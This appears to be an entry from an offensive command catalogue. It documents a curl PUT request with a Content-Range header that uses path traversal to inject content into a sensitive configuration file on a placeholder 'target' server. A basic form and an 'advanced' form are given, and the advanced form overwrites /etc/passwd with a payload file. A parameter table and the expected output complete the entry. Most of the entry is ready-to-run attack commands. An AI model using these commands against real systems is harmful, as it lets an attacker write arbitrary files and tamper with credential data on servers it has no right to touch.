---
data: >-
  curl -X PUT --header "Content-Range: bytes 0-99/100" -d "malicious content
  here" http://target:8080/public/upload/../../sensitive/config.txt -v
tags:
  - exploit
  - path-traversal
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:17.452Z'
id: 792c2179-ccba-4ca8-9db1-b897d879554e
verified: false
validated: true
submitted: true
---
# curl-path-traversal-put

## Command

```bash
curl -X PUT --header "Content-Range: bytes 0-99/100" -d "malicious content here" http://target:8080/public/upload/../../sensitive/config.txt -v
```

## Description

Exploits partial PUT with traversal path to inject into sensitive files via dot replacement.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X PUT` | PUT method | Yes |
| `--header "Content-Range: bytes 0-99/100"` | Range header | Yes |
| `-d "malicious content here"` | Injection data | Yes |
| `http://target:8080/public/upload/../../sensitive/config.txt` | Traversal URL | Yes |
| `-v` | Verbose | No |

## Examples

### Basic Usage

```bash
curl -X PUT --header "Content-Range: bytes 0-99/100" -d "malicious content here" http://target:8080/public/upload/../../sensitive/config.txt -v
```

### Advanced Usage

```bash
curl -X PUT --header "Content-Range: bytes 0-999/1000" --data-binary @payload.bin http://target:8080/upload/../../../etc/passwd -v
```

## Expected Output

HTTP 200 if injection succeeds; temp file created with dots.

## Related

- [[Related Procedure]]
